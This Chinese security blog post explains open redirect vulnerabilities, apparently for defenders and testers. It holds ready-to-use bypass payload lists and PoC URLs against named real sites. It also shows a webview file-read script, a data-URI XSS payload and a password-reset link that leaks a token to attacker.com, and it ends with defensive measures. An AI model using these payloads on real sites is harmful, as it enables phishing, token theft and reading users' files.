{"title":"Redirect攻击原理介绍和利用","slug":"网安大类/OWASPTOP/WebBackEnd/Redirect攻击原理介绍和利用","date":"2019-09-20T02:36:30.000Z","updated":"2022-03-30T05:02:09.821Z","url":"2019/9-20-386.html","path":"api/articles/2019/9-20-386.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190926162916.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190925171436.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190926154938.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190926164054.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190925163044.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190926151407.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言介绍\"><a href=\"#0x00-前言介绍\" class=\"headerlink\" title=\"0x00 前言介绍\"></a>0x00 前言介绍</h4><p>描述: 开放式重定向（Open Redirect）漏洞，又称URL跳转漏洞，收录在CWE通用缺陷列表中，编号CWE-601，漏洞官网描述如下：<br>Web应用程序接受用户控制的输入，该输入指定了指向外部站点的链接，并将其用于重定向过程，这导致了网络钓鱼攻击的发生。</p>\n<p>简单的说: Redirect重定向漏洞就是利用网站正常的跳转来达到跳转攻击者指定恶意页面URL跳转以便进入下一阶段的攻击,注意该漏洞不但Web存在而且在APP中也是存在的;</p>\n<p>Redirect漏洞危害:</p>\n<ul>\n<li>网络钓鱼: 由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息或欺骗用户进行金钱交易；</li>\n<li>链接打开重定向<ul>\n<li>信息盗取,比如CORF</li>\n<li>身份盗用,比如CSRF</li>\n<li>SSRF(服务端请求伪造)</li>\n<li>OAuth令牌信息披露</li>\n<li>XSS</li>\n<li>CRLF注入导致XSS漏洞;</li>\n</ul>\n</li>\n</ul>\n<hr>\n\n<h4 id=\"0x01-重定向漏洞原理\"><a href=\"#0x01-重定向漏洞原理\" class=\"headerlink\" title=\"0x01 重定向漏洞原理\"></a>0x01 重定向漏洞原理</h4><p>描述: 服务端未对传入的跳转URL变量进行检查和控制，可能导致可恶意构造任意一个恶意地址诱导用户跳转到恶意网站;</p>\n<p>URL跳转最典型的例子就是登录跳转，示例代码如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doRedirect</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse res)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    String jumpURL=request.getParameter(<span class=\"string\">\"jumptoURL\"</span>);</span><br><span class=\"line\">    response.setHeader(<span class=\"string\">\"Location\"</span>,jumpURL);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>若程序未过滤jumptoURL参数，攻击者将如下恶意链接发给其他用户,安全意识较低的用户可能会认为该链接展现的内容是信任站点<a href=\"http://www.woo.org的内容，从而导致用户被欺诈。\" target=\"_blank\" rel=\"noopener\">www.woo.org的内容，从而导致用户被欺诈。</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.woo.org/login.jsp?jumptoURL=http://www.evil.com</span><br></pre></td></tr></table></figure></p>\n<p>原理案例检测:在检测的同时可以修改参数中的合法URL为非法URL，然后查看是否能正常跳转或者通过抓包工具获取其HTTP响应头中Host的值是否包含了任意的构造URL。</p>\n<p>如果是struts2重定向漏洞，则可通过web扫描工具扫描发现，或者在URL后添加?redirect:钓鱼链接进行验证。<br>如下两种方式展示了测试验证的过程:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#测试是否可以直接请求跳转：</span></span><br><span class=\"line\">http://locahost/admin/login.action?redirect:http://diaoyu.com</span><br><span class=\"line\"><span class=\"comment\">#测试action跳转的命令是否可以被执行：</span></span><br><span class=\"line\">http://localhost/struts2-blank/example/x.action?action:%25&#123;3*4&#125;</span><br></pre></td></tr></table></figure><br>如下图所示，则可以判断存在URL重定向漏洞<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190926162916.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>TIPS:</p>\n<ul>\n<li>但是现在绝大部分的大网站都是不允许直接跳转网站的(常规的都有白名单),需要对其进行正则匹配测试因为有可能存在跳转的url的参数里面存在SSRF漏洞；</li>\n</ul>\n<hr>\n\n<h4 id=\"0x02-重定向利用\"><a href=\"#0x02-重定向利用\" class=\"headerlink\" title=\"0x02 重定向利用\"></a>0x02 重定向利用</h4><p>描述: 如何挖掘找到重定向漏洞测试入口点?</p>\n<ul>\n<li>谷歌dorking：<code>inurl:redirectUrl=http site:target.com</code></li>\n<li>通常与重定向相关的功能:登录，注销，注册和密码重置页面和改变网站的语言,邮件中的链接</li>\n<li>读取JavaScript代码找寻利用点(弹出警告框)</li>\n<li>寻找常见Redirect parameters参数：Fuzz URL_Redirect Param</li>\n<li>Burp代理历史&amp; Burp站点地图(查看带有参数的url,搜索功能去寻找30X的响应码)<ul>\n<li>Burp Intruder &amp; Burp Repeater</li>\n<li>HTTP重定向状态码特征：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* 300:多个选择</span><br><span class=\"line\">* 301:永久移动</span><br><span class=\"line\">* 302:发现跳转</span><br><span class=\"line\">* 303:看到其他</span><br><span class=\"line\">* 304:没有不修改</span><br><span class=\"line\">* 305:使用代理</span><br><span class=\"line\">* 307:临时重定向</span><br><span class=\"line\">* 308:永久重定向</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190925171436.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ul>\n</li>\n</ul>\n<p><br></p>\n<p><strong>案例1:重定向特殊案例</strong><br>在进行某个网站测试的时候发现了一个重定向网站经过测试发现绕过十分有趣,所以对其进行分享;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#测试URL:打开成功跳转以为跳转成功(实际是因为baidu.com在白名单之中)</span></span><br><span class=\"line\">https://mall.m.xxxxxxx.com/jump.html?url=https://baidu.com  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#我经过了几次绕过之后发现下面的URL可以成功绕过并成功跳转成功</span></span><br><span class=\"line\">https://mall.m.xxxxxxx.com/jump.html?url=https:/\\weiyigeek.github.io</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p><strong>示例2:APP url Schema</strong><br>描述:url跳转到webview安全问题<br>我们这次的漏洞我在手机上测试的时候发现利用APP url Schema是 <code>xxxx://app/webview?url=xxxxxxx</code> ,任意webview跳转已经构成漏洞;</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PoC:</span><br><span class=\"line\">xxxx://app/webview?url=file:///system/etc/hosts #成功读取了手机的敏感host文件</span><br><span class=\"line\"></span><br><span class=\"line\">#凸显危害进行恶意网站访问(嵌入js脚本)注意同源策略的影响</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\"><span class=\"keyword\">var</span> xmlHttp;                <span class=\"comment\">//定义XMLHttpRequest对象</span></span></span><br><span class=\"line\"><span class=\"actionscript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createXmlHttpRequestObject</span><span class=\"params\">()</span></span>&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">    <span class=\"comment\">//如果在internet Explorer下运行</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">window</span>.ActiveXObject)&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">        <span class=\"keyword\">try</span>&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">            xmlHttp=<span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"Microsoft.XMLHTTP\"</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">        &#125;<span class=\"keyword\">catch</span>(e)&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">            xmlHttp=<span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"actionscript\">    &#125;<span class=\"keyword\">else</span>&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">    <span class=\"comment\">//如果在Mozilla或其他的浏览器下运行</span></span></span><br><span class=\"line\"><span class=\"actionscript\">        <span class=\"keyword\">try</span>&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">            xmlHttp=<span class=\"keyword\">new</span> XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"actionscript\">        &#125;<span class=\"keyword\">catch</span>(e)&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">            xmlHttp=<span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"actionscript\">      <span class=\"comment\">//返回创建的对象或显示错误信息</span></span></span><br><span class=\"line\"><span class=\"actionscript\">    <span class=\"keyword\">if</span>(!xmlHttp)</span></span><br><span class=\"line\"><span class=\"actionscript\">        alert(<span class=\"string\">\"error\"</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">        <span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"actionscript\">        <span class=\"keyword\">return</span> xmlHttp;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"actionscript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ReqHtml</span><span class=\"params\">()</span></span>&#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    createXmlHttpRequestObject();</span></span><br><span class=\"line\"><span class=\"actionscript\">    path=<span class=\"string\">'file://'</span></span></span><br><span class=\"line\"><span class=\"actionscript\">    path1=<span class=\"string\">'/system/etc/hosts'</span></span></span><br><span class=\"line\"><span class=\"actionscript\">    xmlHttp.onreadystatechange=StatHandler;    <span class=\"comment\">//判断URL调用的状态值并处理</span></span></span><br><span class=\"line\"><span class=\"actionscript\">    xmlHttp.open(<span class=\"string\">\"GET\"</span>,path+path1,<span class=\"literal\">false</span>);    <span class=\"comment\">//调用test.txt</span></span></span><br><span class=\"line\"><span class=\"actionscript\">    xmlHttp.send(<span class=\"literal\">null</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">    alert(1)</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"actionscript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">StatHandler</span><span class=\"params\">()</span></span>&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">    <span class=\"keyword\">if</span>(xmlHttp.readyState==<span class=\"number\">4</span> &amp;&amp; xmlHttp.status==<span class=\"number\">200</span>)&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"webpage\"</span>).innerHTML=xmlHttp.responseText;</span></span><br><span class=\"line\"><span class=\"undefined\">        alert(xmlHttp.responseText)</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">ReqHtml()</span></span><br><span class=\"line\"><span class=\"undefined\">StatHandler()</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"webpage\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><br></p>\n<p><strong>示例3.挖SRC的一些思路</strong><br>描述:某src的一些存在重定向正常的跳转地址但是对登陆处做了白名单限制：如<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#SRC1:无法跳转到qq.com由于白名单的原因</span></span><br><span class=\"line\">https://xxx.com/login?service=http://www.qq.com </span><br><span class=\"line\"><span class=\"comment\">#这时我们对&#123;login&#125;进行Redirect参数Fuzz发现可以进行任意站点跳转</span></span><br><span class=\"line\">https://xxx.com/<span class=\"built_in\">logout</span>?service=http://www.qq.com </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#SRC2:发现了其中有一个字符在burp中显示回调是“-”这样的一个字符但是实际上我是用“～”这样的一个字符可以利用来二次跳转，第一它能够跳转到京东一个错误的页面，实际上京东对这里做了处理这样就能够二次跳转来进行url跳转攻击(~灵魂之所在)</span></span><br><span class=\"line\">https://meituan.cn/home/nxLogout?redirect_url=http://meituan.com~www.jd.com</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#SRC3:某处URL请求返回一个json格式的登录信息其中最重要的就是token参数值,它利用了一个callback回调中参数302定向</span></span><br><span class=\"line\">- 得到了一个用户token，形成三处组合思路最后一个（用户登陆凭证劫持）利用前面三处漏洞组合</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190926154938.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><strong>示例4：重定向夹杂敏感信息</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Freebuff视频中学习到会返回到referer中</span></span><br><span class=\"line\">Http://localhost:5000/password_reset?token=xsadasdadasdsa&amp;next=//attacker.com <span class=\"comment\">#注意这里不需要https</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#我们还可以通过注入下面的有效载荷从这个重定向获得XSS。（值得学习）</span></span><br><span class=\"line\">http://localhost:8069/web/login?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=</span><br><span class=\"line\">http://localhost:8069/web/login?redirect=data:text/html;text,&lt;script&gt;alert(Hello)&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#使用要重定向的URL(编码)的重定向参数集访问以下URL(也影响版本9)。</span></span><br><span class=\"line\">http://localhost:8069/web/session/<span class=\"built_in\">logout</span>?redirect=https%3a%2f%2fsysdream.com%2f</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#访问svg文件进行跳转</span></span><br><span class=\"line\">思路原理:利用上传的含有恶意代码的svg头像;</span><br><span class=\"line\"><span class=\"comment\">#\"https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=7a6caed489\"</span></span><br><span class=\"line\">&lt;code&gt;</span><br><span class=\"line\">&lt;?xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span> standalone=<span class=\"string\">\"yes\"</span>?&gt;</span><br><span class=\"line\">&lt;svg</span><br><span class=\"line\">onload=<span class=\"string\">\"window.location='http://www.example.com'\"</span></span><br><span class=\"line\">xmlns=<span class=\"string\">\"http://www.w3.org/2000/svg\"</span>&gt;</span><br><span class=\"line\">&lt;/svg&gt;</span><br><span class=\"line\">&lt;/code&gt;</span><br><span class=\"line\"><span class=\"comment\">#PoC</span></span><br><span class=\"line\">https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=7a6caed489</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190926164054.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<hr>\n\n<h4 id=\"0x03-重定向ByPass\"><a href=\"#0x03-重定向ByPass\" class=\"headerlink\" title=\"0x03 重定向ByPass\"></a>0x03 重定向ByPass</h4><p>描述:以下是一些常用重定向ByPass的方法(思路重要),但最对待任何漏洞核心思想都差不了fuzzing;</p>\n<ol>\n<li><p><code>@ 绕过</code>用了浏览器的特性: <code>http://127.0.0.1@baidu.com</code></p>\n<ul>\n<li>说明:Google和其他浏览器直接跳转百度,只有Firefox进行提示(确定后跳转)<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#chrome浏览器特性其他绕过方法</span></span><br><span class=\"line\">http:/\\/baidu.com</span><br><span class=\"line\">http:\\//baidu.com</span><br><span class=\"line\">/\\/baidu.com</span><br><span class=\"line\">http:\\\\\\//baidu.com</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p><code>? 问号绕过</code>可以使用页面Referer作为后缀: <code>https://baidu.com/?weiyigeek.com</code></p>\n<ul>\n<li>说明:绕过正则进行访问百度</li>\n</ul>\n</li>\n<li><p><code># 锚点绕过</code>利用#会被浏览器解释成HTML中的锚点: <code>http://127.0.0.1/#baidu.com</code></p>\n</li>\n<li><p><code>xip.io 绕过</code>: <code>http://www.baidu.com.127.0.0.1.xip.io/</code></p>\n<ul>\n<li>说明: 这样之后会访问127.0.0.1在公网上运行自定义的dns服务器，用他的服务器提取IP地址，在响应中将他取回<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190925163044.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ul>\n</li>\n<li><p><code>\\ 反斜杠绕过</code>: <code>https://maxx.com/jump.html?url=https:/\\baidu.com</code></p>\n</li>\n<li><p><code>IP绕过</code>:把目标的URL修改成IP地址(如何过滤了<code>.</code>号请使用十进制符号的IPv4地址)，这样也有可能绕过waf的拦截(IP地址转换:<a href=\"http://www.geektools.com/geektools-cgi/ipconv.cgi\" target=\"_blank\" rel=\"noopener\">http://www.geektools.com/geektools-cgi/ipconv.cgi</a>)</p>\n</li>\n<li><p><code>HPP参数污染绕过</code>:构造相同的参数两次<code>?next=whitelisted.com&amp;next=google.com</code></p>\n</li>\n<li><p><code>编码绕过</code>:尝试使用双url和三url编码的有效负载版本</p>\n<ul>\n<li>使用 /U+e280 Right to Left Override (RTLO在重定向页面上欺骗域): <code>https://whitelisted.com%40%E2%80%AE@moc.elgoog</code>其中<code>%40%E2%80%AE</code> == @;</li>\n</ul>\n</li>\n<li><p><code>特殊字符绕过</code>:尝试使用不同的符号重定向到IP地址（而不是域）：IPv6，IPv4（十进制，十六进制或八进制）</p>\n</li>\n<li><p><code>利用XSS漏洞绕过</code>:对于XSS尝试将alert(1)替换为 prompt(1) &amp; confirm(1),尝试重定向它的子域上面 <code>target.com/?redirect_url=xss.target.com</code></p>\n</li>\n<li><p><code>文件后缀绕过</code>:如果选中扩展名为.jpg图片跳转可使用这种方式绕过 <code>image_url={payload}/.jpg</code></p>\n</li>\n</ol>\n<p><br></p>\n<p><strong>URL_Redirect特殊字符绕过备忘录</strong><br>描述:注意URL的白名单限制如果做的好的话真的很难绕过这时就需要与参数结合之后有可能完成绝杀;<br>使用方法使用burpsuite进行Request请求如下<code>/xxx?Parameter_Payload={URL_payload}</code>(更多的请看FUZZ字典 UrlRedirect-ByPass.txt)<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#打开重定向（URL重定向) ByPass payload</span></span><br><span class=\"line\">?url=https://allow_domain.weiyigeek.com</span><br><span class=\"line\">?url=https://allow_domain@weiyigeek.com</span><br><span class=\"line\">?url=https://www.weiyigeek.com<span class=\"comment\">#allow_domain</span></span><br><span class=\"line\">?url=https://www.weiyigeek.com?allow_domain</span><br><span class=\"line\">?url=https://www.weiyigeek.com\\allow_domain</span><br><span class=\"line\">?url=https://www.weiyigeek.com&amp;allow_domain</span><br><span class=\"line\">?url=http:///////////www.weiyigeek.com</span><br><span class=\"line\">?url=http:\\\\www.weiyigeek.com</span><br><span class=\"line\">?url=http:\\/\\/www.weiyigeek.com</span><br><span class=\"line\">?url=https://www.weiyigeek.com%40%E2%80%AEallow_domain</span><br><span class=\"line\">?url=https://google.com@<span class=\"string\">\"twitter.com</span></span><br><span class=\"line\"><span class=\"string\">?url=https://google.com@'twitter.com</span></span><br><span class=\"line\"><span class=\"string\">?url=https://google.com@/twitter.com</span></span><br></pre></td></tr></table></figure></p>\n<hr>\n\n<h4 id=\"0x04-安全防御\"><a href=\"#0x04-安全防御\" class=\"headerlink\" title=\"0x04 安全防御\"></a>0x04 安全防御</h4><p>1.若跳转的URL事先是可以确定的，包括URL和参数的值，则可以在后台先配置好，URL参数只需传对应URL的索引即可，通过索引找到对应具体URL再进行跳转；<br>2.若跳转的URL事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名，而跳转首先需要进行验证签名通过才能进行跳转；<br>3.若1和2都不满足，URL事先无法确定，只能通过前端参数传入，则必须在跳转的时候对URL进行规则校验：即校验URL是否是授权的白名单或者是符合规则的URL，参考代码示例如下。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> checkURL (sURL) &#123;</span><br><span class=\"line\"><span class=\"built_in\">return</span> (/^(https?:\\/\\/)?[\\w\\-.]+\\.(yourDomainA|yourDomainB|yourDomainC)\\.com($|\\/|\\\\)/i).<span class=\"built_in\">test</span></span><br><span class=\"line\">(sUrl)||(/^[\\w][\\w\\/\\.\\-_%]+$/i).<span class=\"built_in\">test</span>(sUrl)||(/^[\\/\\\\][^\\/\\\\]/i).<span class=\"built_in\">test</span>(sUrl) ? <span class=\"literal\">true</span> : <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>4.通过对Referer的限制：如果确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接；<br>5.加入有效性验证Token：保证所有生成的链接都是来自于可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，在跳转时做判断，指定跳转的值。当用户访问需要跳转URL的页面时，生成随机token，并保存到Cookie中，后台应用程序在跳转前，判断token是否和cookie中的token一致。<br>6.理论上讲，URL跳转属于CSRF的一种，跳转URL检测中也加入了CRLF头部注入漏洞的检测逻辑, 具体就是在请求参数中加入了%0d%0a这种测试代码，需要对这些参数进行删除处理;<br>7.如果为Struts2重定向漏洞，则需要更新相关的struts2的版本到最新。</p>\n<hr>\n\n<h4 id=\"0x05-补充附录\"><a href=\"#0x05-补充附录\" class=\"headerlink\" title=\"0x05 补充附录\"></a>0x05 补充附录</h4><p><strong>1) URL_Redirect Parameter</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span 